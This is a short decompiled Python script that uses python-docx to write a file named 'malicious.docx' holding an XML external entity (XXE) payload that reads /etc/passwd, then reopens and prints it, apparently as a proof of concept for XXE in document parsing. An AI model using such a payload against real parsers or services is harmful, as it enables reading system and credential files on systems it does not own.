# uncompyle6 version 3.9.2
# Python bytecode version base 3.8.0 (3413)
# Decompiled from: Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
# [GCC 9.4.0]
# Embedded file name: 361_1.py
# Compiled at: 2024-12-16 05:39:22
# Size of source mod 2**32: 569 bytes
import docx
malicious_doc = docx.Document()
malicious_doc.add_paragraph('<?xml version="1.0"?>\n    <!DOCTYPE root [\n        <!ENTITY xxe SYSTEM "file:///etc/passwd">\n    ]>\n    <root>\n        <data>&xxe;</data>\n    </root>')
malicious_doc.save("malicious.docx")
doc = docx.Document("malicious.docx")
content = doc.paragraphs[0].text
print(content)

# okay decompiling 361_1.pyc
